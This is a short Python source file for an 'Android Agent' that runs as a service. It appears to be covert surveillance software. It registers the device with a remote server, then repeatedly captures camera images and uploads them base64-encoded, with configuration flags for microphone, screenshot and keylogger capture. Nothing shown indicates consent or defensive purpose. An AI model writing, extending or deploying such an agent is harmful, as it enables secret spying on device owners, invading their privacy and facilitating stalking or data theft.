"""
Android Agent – runs as a service.
"""
import os
import sys
import json
import time
import socket
import uuid
import platform
import threading
import logging
import requests
import cv2
import numpy as np
from PIL import Image
import io
import base64

# Load config
CONFIG_FILE = os.path.join(os.getcwd(), 'config.json')
if os.path.exists(CONFIG_FILE):
    with open(CONFIG_FILE) as f:
        config = json.load(f)
else:
    config = {
        "server_url": "http://YOUR_SERVER_IP:5000",
        "capture_interval": 60,
        "enable_camera": True,
        "enable_mic": False,
        "enable_screenshot": False,
        "enable_keylogger": False
    }

SERVER_URL = config.get('server_url', 'http://127.0.0.1:5000')
hostname = socket.gethostname()
agent_id = hostname + '-' + str(uuid.uuid4())[:8]

def register():
    info = {
        'hostname': hostname,
        'os': 'Android',
        'user': os.getenv('USER', 'unknown'),
        'arch': platform.machine()
    }
    try:
        r = requests.post(f"{SERVER_URL}/api/register", 
                         json={'id': agent_id, 'info': info}, timeout=10)
        return r.status_code == 200
    except:
        return False

def send_log(log_type, data):
    try:
        requests.post(f"{SERVER_URL}/api/log", 
                     json={'agent_id': agent_id, 'type': log_type, 'data': data[:2000]}, timeout=10)
    except:
        pass

def send_media(media_type, data_bytes):
    try:
        b64 = base64.b64encode(data_bytes).decode('utf-8')
        requests.post(f"{SERVER_URL}/api/media", 
                     json={'agent_id': agent_id, 'type': media_type, 'data': b64}, timeout=10)
    except:
        pass

def capture_camera():
    """Capture from Android camera using OpenCV."""
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()
        if ret:
            _, buf = cv2.imencode('.jpg', frame)
            return buf.tobytes()
    except:
        pass
    return None

def main_loop():
    """Main agent loop."""
    if not register():
        logging.error("Registration failed")
        return
    
    while True:
        try:
            # Camera
            if config.get('enable_camera', True):
                img_bytes = capture_camera()
                if img_bytes:
                    send_media('image', img_bytes)
                    send_log('info', 'Image captured')
            
            # Add more captures here...
            
            time.sleep(config.get('capture_interval', 60))
        except Exception as e:
            logging.error(f"Error: {e}")
            time.sleep(10)

if __name__ == '__main__':
    main_loop()